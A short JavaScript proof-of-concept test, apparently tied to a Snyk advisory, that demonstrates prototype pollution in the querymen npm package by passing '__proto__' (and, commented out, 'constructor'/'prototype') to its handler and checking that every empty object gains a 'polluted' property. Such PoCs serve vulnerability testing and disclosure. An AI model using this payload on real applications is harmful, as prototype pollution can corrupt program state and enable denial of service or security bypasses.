// //https://snyk.io/vuln/SNYK-JS-QUERYMEN-559867
// test("prototype pollution in querymen", () => {
  var a = require("querymen");
  obj = {};

console.log({}.polluted);
//a.handler("constructor","prototype", "polluted", "yes");
a.handler("__proto__", "polluted", "yes");
console.log({}.polluted);
// });
